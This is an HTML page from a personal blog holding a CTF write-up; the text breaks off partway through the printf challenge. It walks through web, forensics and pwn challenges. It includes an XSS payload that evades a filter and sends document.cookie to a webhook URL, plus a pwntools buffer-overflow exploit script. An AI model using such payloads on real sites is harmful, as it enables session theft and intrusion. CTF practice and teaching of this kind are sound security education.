@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="This was a really fun CTF with plenty of variety in terms of challenges. Lots of fun doable ones with plenty of learning opportunities as well as some more challenging ones. I managed to pull off a second place finish with the help of the smaller number of players (40 odd) and the generosity of the pwn challenge points.
+Idiot warning ⚠️
+Please note that everything I write here and in these blogs is what I think I know to be true." />
+<meta name="keywords" content=", hacking, CTF, Binary Exploitation, Web Hacking, Steganography" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://cybernetic.coffee/blog/atlassian-ctf/" />
+
+
+    <title>
+        
+            Atlassian{CTF Writeup} :: Cybernetic Coffee 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.64cc374c419669695f00d5c55727fea41e0fdc86b9beb1b4d1d1bcf24284f422.css">
+
+
+
+
+<link rel="shortcut icon" href="https://cybernetic.coffee/images/favicon.ico" />
+
+
+<meta itemprop="name" content="Atlassian{CTF Writeup}">
+<meta itemprop="description" content="This was a really fun CTF with plenty of variety in terms of challenges. Lots of fun doable ones with plenty of learning opportunities as well as some more challenging ones. I managed to pull off a second place finish with the help of the smaller number of players (40 odd) and the generosity of the pwn challenge points.
+Idiot warning ⚠️
+Please note that everything I write here and in these blogs is what I think I know to be true."><meta itemprop="datePublished" content="2021-10-22T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-10-22T00:00:00+00:00" />
+<meta itemprop="wordCount" content="2220">
+<meta itemprop="keywords" content="hacking,CTF,Binary Exploitation,Web Hacking,Steganography," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Atlassian{CTF Writeup}"/>
+<meta name="twitter:description" content="This was a really fun CTF with plenty of variety in terms of challenges. Lots of fun doable ones with plenty of learning opportunities as well as some more challenging ones. I managed to pull off a second place finish with the help of the smaller number of players (40 odd) and the generosity of the pwn challenge points.
+Idiot warning ⚠️
+Please note that everything I write here and in these blogs is what I think I know to be true."/>
+
+
+
+
+
+    <meta property="article:section" content="Hacking" />
+
+    <meta property="article:section" content="CTF" />
+
+    <meta property="article:section" content="Binary Exploitation" />
+
+    <meta property="article:section" content="Web Hacking" />
+
+
+
+    <meta property="article:published_time" content="2021-10-22 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <script src="https://kit.fontawesome.com/5eb4842dc5.js" crossorigin="anonymous"></script>
+
+<a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__text">Cybernetic <i class="fas fa-mug-hot"> </i> </span>
+            <span class="logo__mark"><i class="fas fa-terminal"></i></span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#00ba68;
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://cybernetic.coffee/feed/">Activity Feed</a></li><li><a href="https://cybernetic.coffee/projects/">Projects</a></li><li><a href="https://cybernetic.coffee/blog">Blog</a></li><li><a href="https://cybernetic.coffee/ctf">CTF</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+        
+        <div class="post-info">
+            <p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                    <line x1="16" y1="2" x2="16" y2="6"></line>
+                    <line x1="8" y1="2" x2="8" y2="6"></line>
+                    <line x1="3" y1="10" x2="21" y2="10"></line>
+                </svg>
+                
+                    2021-10-22 11:00
+                
+
+                
+            </p>
+        </div>
+        
+
+        <article>
+            <h2 class="post-title"><a href="https://cybernetic.coffee/blog/atlassian-ctf/">Atlassian{CTF Writeup}</a></h2>
+
+            
+
+            
+            <div class="post-info">
+
+                <div class="sharing-buttons">
+                    
+
+
+
+
+
+
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fcybernetic.coffee%2fblog%2fatlassian-ctf%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fcybernetic.coffee%2fblog%2fatlassian-ctf%2f&amp;resubmit=true&amp;title=Atlassian%7bCTF%20Writeup%7d" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fcybernetic.coffee%2fblog%2fatlassian-ctf%2f&amp;t=Atlassian%7bCTF%20Writeup%7d" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+
+
+
+
+
+
+
+                </div>
+            </div>
+            
+
+            <hr />
+
+            
+                
+                <aside id="toc">
+                
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#0x31-fly">0x31 fly</a></li>
+        <li><a href="#0x40-captcha">0x40 Captcha</a></li>
+        <li><a href="#0x44-door">0x44 Door</a></li>
+        <li><a href="#0x45-sésame-ouvre-toi">0x45 Sésame, ouvre-toi</a></li>
+        <li><a href="#0x47-simplexss">0x47 simplexss</a></li>
+        <li><a href="#0x50-door">0x50 door</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics">Forensics</a>
+      <ul>
+        <li><a href="#http-ok">HTTP OK</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">pwn</a>
+      <ul>
+        <li><a href="#pwnd">pwnd</a></li>
+        <li><a href="#jump">jump</a></li>
+        <li><a href="#printf">printf</a></li>
+        <li><a href="#baby-rop">baby rop</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                </aside>
+                
+            
+
+            
+
+            <div class="post-content">
+                <p>This was a really fun CTF with plenty of variety in terms of challenges. Lots of fun doable ones with plenty of learning opportunities as well as some more challenging ones. I managed to pull off a second place finish with the help of the smaller number of players (40 odd) and the generosity of the <code>pwn</code> challenge points.</p>
+<p><img src="https://i.imgur.com/ze1MLSZ.png" alt=""></p>
+<p><strong>Idiot warning ⚠️</strong></p>
+<blockquote>
+<p>Please note that everything I write here and in these blogs is what I <em>think</em> I know to be true. Don&rsquo;t accept everything I say as fact I am in fact a scrub 🖤</p>
+</blockquote>
+<h2 id="web">Web</h2>
+<h3 id="0x31-fly">0x31 fly</h3>
+<ol>
+<li>looks like path traversal, the file is grabbed using a path param in the url</li>
+<li>Try several payloads and common files including flag.txt</li>
+<li>Realise that some are returning 404 and others are getting caught by the proxy</li>
+<li>Realise <code>.</code> is detected</li>
+<li>Try bypass with encoding including on the <code>.txt</code> extension</li>
+<li>Profit</li>
+</ol>
+<blockquote>
+<p><code>flag{lfi_i$_still_a_thing!}</code></p>
+</blockquote>
+<h3 id="0x40-captcha">0x40 Captcha</h3>
+<p>In this challenge you have a web form which presents a simple captcha interface with a form to enter the characters shown in the image. If we enter the captcha correctly the count goes up but the required number of correct solves to get the flag is unknown. This means the challenge is intended as a scripting based one.</p>
+<p>Initially I assumed the challenge would require OCR to extract the text from the image programmatically. However, when examining the source for the web page to find the img element in the DOM I noticed that the <code>class</code> name for the <code>img</code> element included the characters in the captcha.</p>
+<p>This means we can just scrape the web page with a utility like beautiful soup and parse the HTML to extract the class name from the image element and send it back to the server.</p>
+<p>The other thing we need to keep in mind is that the server needs a way to know which client (player) is entering captchas in order to track the progress and award the flag. This is done with a session token/cookie which is sent in responses from the server and needs to be included in requests we send back in order to track our captcha entering progress. The python <code>requests</code> lib supports this out of the box with a method <code>Session()</code> which automatically extracts cookies from server responses and sends them back in the request headers. Thus we construct a script like the one bellow to get the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Use bs4 and requests to solve some x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">captcha&#39;s by extracting the capture
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">data leaked in the img class name.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TARGET_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://ctfo.2pmc.net:10022/&#39;</span>
+</span></span><span style="display:flex;"><span>sesh <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(count<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">&#34;[&gt;&gt;] Scraping target DOM&#34;</span>)
+</span></span><span style="display:flex;"><span>	target_html <span style="color:#f92672">=</span> sesh<span style="color:#f92672">.</span>get(TARGET_URL)<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	soup <span style="color:#f92672">=</span> BeautifulSoup(target_html, <span style="color:#e6db74">&#34;html.parser&#34;</span>)
+</span></span><span style="display:flex;"><span>	dom_target <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;img&#34;</span>)<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;class&#39;</span>)
+</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[&gt;&gt;] extracted target </span><span style="color:#e6db74">{</span>dom_target<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>	secret <span style="color:#f92672">=</span> dom_target[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[&gt;&gt;] sending </span><span style="color:#e6db74">{</span>secret<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># send back captcha</span>
+</span></span><span style="display:flex;"><span>	res <span style="color:#f92672">=</span> sesh<span style="color:#f92672">.</span>post(
+</span></span><span style="display:flex;"><span>			TARGET_URL,
+</span></span><span style="display:flex;"><span>			data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>				<span style="color:#e6db74">&#34;secret&#34;</span>: secret,
+</span></span><span style="display:flex;"><span>				<span style="color:#e6db74">&#34;submit&#34;</span>: <span style="color:#e6db74">&#34;verify&#34;</span>
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>	)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[&gt;&gt;] res </span><span style="color:#e6db74">{</span>res<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (count <span style="color:#f92672">==</span> <span style="color:#ae81ff">70</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>	main(count)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>	main()
+</span></span></code></pre></div><blockquote>
+<p><code>flag{N0_n33d_f0r_0CR}</code></p>
+</blockquote>
+<h3 id="0x44-door">0x44 Door</h3>
+<ol>
+<li>Go to a blog</li>
+<li>Url has a sequential value to reference the blog IE <code>/blog/3</code></li>
+<li>The other blogs go up from <code>3</code> and the lowest one with a link is blog <code>2</code></li>
+<li>Navigate to <code>/1</code></li>
+</ol>
+<blockquote>
+<p><code>flag{1ns3cur3_0bj3c+_r3f3rnces_are_dank}</code></p>
+</blockquote>
+<h3 id="0x45-sésame-ouvre-toi">0x45 Sésame, ouvre-toi</h3>
+<ol>
+<li>SQLI vuln</li>
+<li>Post based</li>
+<li><code>&quot;</code> syntax</li>
+<li>SQLmap hard, csrf token impact?</li>
+<li>Nope default creds</li>
+</ol>
+<pre tabindex="0"><code>admin
+password
+</code></pre><blockquote>
+<p><code>flag{didnt_save_mybad}</code></p>
+</blockquote>
+<h3 id="0x47-simplexss">0x47 simplexss</h3>
+<p>A dead giveaway that a challenge is an XSS based one is if the web application suggests that some &lsquo;other person&rsquo; will look at a page that you can control the contents of to some extent. This is because XSS happens in the browser when javascript makes its way into the DOM context, and is subsequently rendered (processed), which means someone else (or a bot) needs to look at the page you inject with your XSS payload in order to trigger it from their perspective.</p>
+<p>In this case the page we control has a simple XSS filter on the word <code>script</code> so we can simply switch the case to caps since all HTML elements are case insensitive in order to evade the filter.</p>
+<p>Since we cannot &lsquo;see&rsquo; the clients web page we are attacking we need a way to capture their cookie and send it some place we can see. This is called an out of band approach. A great way to do this for XSS is with a webhook website like <a href="https://pipedream.net">pipedream</a> or requestbin which gives you an ephemeral public url that you can place in your payload, which when triggered makes a request to the url with the targets cookie as a parameter.</p>
+<p>A sample payload bellow:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SCRIPT</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`https://&lt;ur-subdomain&gt;.m.pipedream.net?cookie=</span><span style="color:#e6db74">${</span>encodeURIComponent(document.<span style="color:#a6e22e">cookie</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/ScRiPt&gt;</span>
+</span></span></code></pre></div><blockquote>
+<p><code>flag{S00_XSS_1snt_that_h@rd}</code></p>
+</blockquote>
+<h3 id="0x50-door">0x50 door</h3>
+<ol>
+<li>Looks like xss because of the message that a bot will look at the page after submitting the form</li>
+<li>Can get payload into DOM but no cookies to grab</li>
+<li>Check robots.txt for an internal page to grab instead of the cookie, instead find the flag</li>
+</ol>
+<blockquote>
+<p><code>flag{SW4nky_r0b0ts_txt_w0w_who_wouldve_guessed}</code></p>
+</blockquote>
+<h2 id="forensics">Forensics</h2>
+<h3 id="http-ok">HTTP OK</h3>
+<p>This was a typical PCAP forensics challenge which required you to search body of packets in the supplied packet capture file. Initially before I even open wireshark for challenges like this I like to use an <a href="https://apackets.com/">online packet analyser</a> which can often reveal information that would take a long time to dig through in wireshark. Such things include:</p>
+<ul>
+<li>Images</li>
+<li>Other file types</li>
+<li>HTTP request bodies and headers</li>
+<li>Ethernet connections</li>
+</ul>
+<p>In this case I was not able to find any flags or items of interest in the analysis.</p>
+<p><em>Bonus Tip: if the capture is too large to upload to the site you can split it into two with the command line and upload both parts</em></p>
+<p>Thus I turned to wireshark to analyse the capture. Probably the first step here should always be to do the equivalent of &lsquo;grepping&rsquo; the capture for the flag syntax using the search string function.</p>
+<p><img src="https://i.imgur.com/3KKdqoJ.png" alt=""></p>
+<p>Take care to try all three options in the far left dropdown, pictured &lsquo;Packet bytes&rsquo;. This turns up the flag in the packet bytes of one such HTTP request.</p>
+<p><img src="https://i.imgur.com/cWGERsu.png" alt=""></p>
+<pre tabindex="0"><code>&lt;snip&gt;
+
+0300   1b 88 0e 5f c6 d1 a1 f1 cf c8 d5 8f 35 30 08 07   ..._........50..
+0310   1d b2 7c 8a e6 71 b2 7c 7c 3c c5 57 fa 05 19 12   ..|..q.||&lt;.W....
+0320   9f f8 94 06 79 e8 0f 3c 87 a5 69 e0 84 ae 43 72   ....y..&lt;..i...Cr
+0330   8f 8e 68 96 bb 08 4e d3 8e d0 5b 5a 12 f1 81 66   ..h...N...[Z...f
+0340   53 be dd 40 23 b3 ab 7e 42 1b 4f 7f 41 5f b6 60   S..@#..~B.O.A_.`
+0350   0a cf 93 15 f6 b1 16 fe cf 1e e2 d1 38 b4 df eb   ............8...
+0360   0d 82 3d a7 aa 88 90 ee 30 82 82 f1 4d a1 4b 07   ..=.....0...M.K.
+0370   da 26 a5 36 e6 25 cf 3e 34 2c 59 1f 41 5a 49 ca   .&amp;.6.%.&gt;4,Y.AZI.
+0380   64 74 72 6f 6a 61 6e 5f 66 6c 61 67 7b 73 74 72   dtrojan_flag{str
+0390   69 6e 67 73 5f 61 72 65 5f 6d 79 5f 66 72 69 65   ings_are_my_frie
+03a0   6e 64 7d                                          nd}
+</code></pre><blockquote>
+<p><code>trojan_flag{strings_are_my_friend}</code></p>
+</blockquote>
+<h2 id="pwn">pwn</h2>
+<h3 id="pwnd">pwnd</h3>
+<ol>
+<li>Use <a href="https://docs.pwntools.com/en/stable/">pwntools</a> to send the raw <code>0x7</code> byte</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">## get da banner</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Receiving banner ...&#39;</span>)
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;printFlag &#39;</span>)
+</span></span><span style="display:flex;"><span>print_flag_addr <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>passwd <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;supe</span><span style="color:#ae81ff">\x07</span><span style="color:#e6db74">r_s3cret&#39;</span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Enter the password: &#39;</span>, passwd)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># shellit</span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="jump">jump</h3>
+<p>This challenge was a standard ret2win type buffer overflow challenge. We start by observing that the binary leaks the memory address of <code>printFlag</code> and also that the function is not called anywhere in the program. In such cases the goal is to call that function ourself, typically by exploiting a buffer overflow.</p>
+<p>There are a few ways to determine if the binary is vulnerable to a buffer overflow but my personal favourite is to run the binary with <code>gdb</code> and then use <code>cyclic</code> to generate a big patterned input we can then use to calculate the offset to the return pointer. In this case we produced a crash with <code>cyclic 100</code> and the offset was around <code>cyclic_find(b'agaa') - 5</code>. We can then chain this with the leaked address of <code>printFlag</code> to swap out the return pointer with its address causing the binary to jump there when it returns.</p>
+<p>This worked fine locally but failed against the remote server so I fuzzed the offset until the payload popped on <code>cyclic_find(b'agaa') - 1</code>.</p>
+<p><em>If you want to read more about basic overflows I also wrote this guide, <a href="https://cybernetic.coffee/blog/basic-stack-based-overflows/">Basic Stack Based Overflows</a></em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ctfo.2pmc.net:10003&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34; hack the program &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;./</span><span style="color:#e6db74">{</span>PATH<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>BINARY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> process(binary)
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(binary)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(binary, <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## get da banner</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Receiving banner ...&#39;</span>)
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;printFlag &#39;</span>)
+</span></span><span style="display:flex;"><span>print_flag_addr <span style="color:#f92672">=</span> int(proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;.&#39;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;printFlag leak: </span><span style="color:#e6db74">{</span>hex(print_flag_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Worked locally</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># offset = cyclic_find(b&#39;agaa&#39;) - 5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># offset for remote</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;agaa&#39;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Offset: </span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>    offset: p64(print_flag_addr)
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;name: &#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># shellit</span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><blockquote>
+<p><code>flag{sup3rrrrrr_s1mple_pwn}</code></p>
+</blockquote>
+<h3 id="printf">printf</h3>
+<p>This was a pleasantly straightforward format string based binary which included the source code of the program. The only real prerequisite was knowing that you can use <code>%n</code> (and its variants) in the presence of a format string vuln to write to memory. Taking a look at the source code our main function of interest is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">authenticate</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// find this buf
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">200</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> isAllowed <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>isAllowed);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(buf, <span style="color:#ae81ff">200</span>, stdin);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(buf);
